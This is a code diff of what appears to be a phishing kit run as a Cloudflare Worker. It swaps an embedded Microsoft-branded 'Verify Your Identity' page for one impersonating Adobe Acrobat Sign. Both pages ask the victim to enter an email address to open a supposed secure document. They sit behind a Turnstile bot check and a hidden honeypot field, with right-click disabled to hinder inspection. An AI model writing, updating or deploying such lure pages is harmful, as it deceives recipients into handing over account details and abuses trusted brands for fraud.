@@ -575,202 +575,52 @@ async function getRandomRedirectUrl(env) {
 async function serveStaticFile(filename) {
   const files = {
     'index.html': `<!DOCTYPE html>
-<html lang="en">
-<head>
-	<meta charset="UTF-8" />
-	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
-	<title>Verify Your Identity</title>
-	<style type="text/css">body {
-            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 90vh;
-            color: #333;
-            background-image: url('https://i.postimg.cc/2yCKWRgT/454a309b-0d26-4b60-86e9-acaf4e25cf74.jpg'); /* Add your background image here */
-            background-size: cover;
-            background-position: center;
-        }
-
-        .header {
-            width: 100%;
-            background-color: #0078d4;
-            color: white;
-            text-align: left;
-            padding: 10px 20px;
-            box-sizing: border-box;
-            font-size: 18px;
-            position: absolute;
-            top: 0;
-        }
-
-        .header span {
-            margin-left: 20px;
-        }
-
-        .container {
-            background-color: white;
-            border: 1px solid #ccc;
-            border-radius: 20px;
-            padding: 33px;
-            width: 80%;
-            max-width: 300px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            margin-top: 0px;
-        }
-
-        .container img {
-            width: 155px; /* Increased width */
-            margin-bottom: 5px;
-            margin-top: 20px;
-        }
-
-        .container h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
-        }
-
-        .container p {
-            margin-bottom: 10px;
-            color: #666;
-        }
-
-        .container p2 {
-            margin-bottom: 10px;
-            color: #666;
-            font-size: 13px;
-            margin-bottom: 20px;
-        }
-
-        .container input[type="email"] {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 3px;
-            font-size: 16px;
-            box-sizing: border-box;
-            text-align: center;
-        }
-
-        .container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #0078d4;
-            color: white;
-            border: none;
-            border-radius: 3px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        .container button:hover {
-            background-color: #005a9e;
-        }
-
-        .container button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-
-        .container .footer {
-            font-size: 12px;
-            color: #888;
-            margin-top: 20px;
-        }
-
-        .turnstile-container {
-            margin: 20px 0;
-            display: flex;
-            justify-content: center;
-        }
-
-        .message {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 14px;
-            display: none;
-        }
-
-        .message.success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-
-        .message.error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-
-        .honeypot-field {
-            position: absolute;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-        }
-
-        @media (max-width: 600px) {
-            .container {
-                padding: 20px;
-            }
-
-            .container h2 {
-                font-size: 20px;
-            }
-
-            .container .space {
-                margin-bottom: 20px;
-            }
-
-            .container input[type="email"] {
-                font-size: 14px;
-            }
-
-            .container button {
-                font-size: 14px;
-            }
-        }
-	</style>
-	<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-</head>
-<body>
-<div class="container">
-    <img alt="" src="https://i.postimg.cc/3N0shf46/download.png" />
-    <h2>Verify Your Identity</h2>
-
-    <p><strong>You've received a secure document:</strong></p>
-    <p2>To access this secure document, we'll need to verify the intended recipient's email. Please enter the email address to which this document was shared.</p2>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     
-    <form id="emailForm">
-        <input id="email-input" placeholder="Enter email" required="" style="margin-top: 10px;" type="email" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Before we continue...</title>
+    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAABjUlEQVR4nO2XOywEURiFP6/Q2Eh2KWxJlJLtvDqPSkOho5RQWjQKSgnRLqVHJ6EnEhWNSEgUXo2IQihQkIhHJhmyGTNn7tydTRR7kr+ac8//zcy9d+5ASf9EdcCRYWVETiZCjtPzVyngy6CugXKCVQZcGGalbACmCNd0sQDegAYDACfrtRgA65hroxgAnREAuuIGOCO6TuMEGLMAGI8L4AVIWADUAk9xAORCNh61MeXiAMiIBivAsrjeWijAQcgjfjZ4RYeFAAwbTjI1SUdsAR6AGhF8nOc9Eb5q4N4GYEGEdvj424V/MSrAJ9AiAtd8AleFvwn4iAKwI8KSAR8b52NVL8btRgEYEEFZsbQmxLhBU4A7oEocOM4FwKXr8VMlcGsCMCvuokc0/6luMX4uDOAdSIuANmDUU48egE0xPu32CATYIrqWPABOg0bh31YAvRYAze6yzYeYEf6+IICrkBOv0p4H4AaoCJnIfwCy2GvIZzL2C/+kFyDhbjC2cpbtvufHY174k5aHnJKIXd8y0FiwJ5MhSAAAAABJRU5ErkJggg==" type="image/png">
+    <script type="module" crossorigin="" src=""></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/igun89/css@main/index-9eef6c26.css">
+  </head>
+  <body>
+    <div id="app" data-v-app=""><div class="background"><!----><div data-v-527512fb="" class="adobe-sign-container"><div data-v-527512fb="" class="sign-card"><div class="header" data-v-527512fb=""><div class="logo-text" data-v-527512fb=""><span class="person-icon" data-v-527512fb="">⼈</span> Adobe Acrobat Sign </div><img class="adobe-logo" src="./Before we continue..._files/email-adobe-tag-classic@2x.png" alt="Adobe Logo" data-v-527512fb=""></div><div class="success-check" data-v-527512fb="">✓</div><div data-v-527512fb="" class="content"><p data-v-527512fb=""><strong data-v-527512fb="">Verify the intended recipient's email.</strong></p><p data-v-527512fb="">Enter the email address to which this item was shared to sign your document.</p><input data-v-527512fb="" type="email" placeholder="Enter email" required="" id="email-input"><!----></div><button data-v-527512fb="" id="continue-button">OPEN</button><div data-v-527512fb="" class="divider"></div><p data-v-527512fb="" class="footer-text"> Attached is the final agreement for your reference. Read it with <a data-v-527512fb="" href="#">Acrobat Reader</a>. You can also <a data-v-527512fb="" href="#">open it online</a> to review its activity history. </p></div><div data-v-527512fb="" class="global-footer"><p data-v-527512fb=""><strong data-v-527512fb="">Powered by</strong></p><img data-v-527512fb="" class="footer-logo" src="./Before we continue..._files/email-adobe-sign-logo.3@2x.png" alt="Adobe Sign Logo"><p data-v-527512fb="">Need your own documents signed? Adobe Acrobat Sign can help save you time. <a data-v-527512fb="" href="#">Learn more</a>.</p><p data-v-527512fb="">To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book.</p><p data-v-527512fb="">Terms of Use | Report Abuse</p><p data-v-527512fb="">© 2025 Adobe. All rights reserved.</p></div></div></div></div>
+    
+    <!-- Honeypot field -->
+    <input type="text" id="honeypotField" class="honeypot-field" name="honeypot" autocomplete="off" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;">
+    
+    <!-- Turnstile container -->
+    <div id="turnstile-widget" data-sitekey="0x4AAAAAABnnez0Dy-TkLp3r" style="display: none;"></div>
+    
+    <!-- Message display -->
+    <div id="message" class="message" style="display: none; margin-top: 15px; padding: 10px; border-radius: 5px; font-size: 14px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border: 1px solid #ccc; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 1000; min-width: 200px; text-align: center;"></div>
+    
+    <style>
+        .message.success {
+            background-color: #d4edda !important;
+            color: #155724 !important;
+            border: 1px solid #c3e6cb !important;
+        }
         
-        <div class="turnstile-container">
-            <div id="turnstile-widget" data-sitekey="0x4AAAAAABnnez0Dy-TkLp3r"></div>
-        </div>
+        .message.error {
+            background-color: #f8d7da !important;
+            color: #721c24 !important;
+            border: 1px solid #f5c6cb !important;
+        }
         
-        <button id="continue-button" type="submit" disabled>Next</button>
+        #email-input.error {
+            border: 2px solid #dc3545 !important;
+            animation: shake 0.5s ease-in-out;
+        }
         
-        <!-- Honeypot field -->
-        <input type="text" id="honeypotField" class="honeypot-field" name="honeypot" autocomplete="off" />
-    </form>
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+    </style>
 
-    <div id="message" class="message"></div>
-
-    <div class="footer" style="font-family:'Segoe UI'; ">
-        <p>Encrypted by Microsoft</p>
-        <a href="https://privacy.microsoft.com/en-gb/privacystatement" target="_blank">Privacy Statement</a><br />
-        Microsoft Corporation, One Microsoft Way, Redmond, WA 98052 USA
-    </div>
-</div>
-
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 <script>
     // Disable right-click
     document.addEventListener('contextmenu', function(e) {
@@ -780,7 +630,7 @@ async function serveStaticFile(filename) {
     // Main application logic
     class SecureRedirectApp {
         constructor() {
-            this.form = document.getElementById('emailForm');
+            this.form = document.querySelector('.sign-card');
             this.emailInput = document.getElementById('email-input');
             this.submitBtn = document.getElementById('continue-button');
             this.messageDiv = document.getElementById('message');
@@ -795,7 +645,7 @@ async function serveStaticFile(filename) {
         }
         
         setupEventListeners() {
-            this.form.addEventListener('submit', (e) => this.handleSubmit(e));
+            this.submitBtn.addEventListener('click', (e) => this.handleSubmit(e));
             this.emailInput.addEventListener('input', () => this.clearError());
         }
         
@@ -943,7 +793,7 @@ async function serveStaticFile(filename) {
                 this.submitBtn.textContent = 'Verifying...';
                 this.submitBtn.disabled = true;
             } else {
-                this.submitBtn.textContent = 'Next';
+                this.submitBtn.textContent = 'OPEN';
                 // Keep disabled if Turnstile is not completed
                 if (window.turnstile && window.turnstile.getResponse()) {
                     this.submitBtn.disabled = false;
@@ -957,8 +807,7 @@ async function serveStaticFile(filename) {
         new SecureRedirectApp();
     });
 </script>
-</body>
-</html>`,
+</body></html>`,
     'styles.css': `/* Reset and base styles */
 * {
     margin: 0;
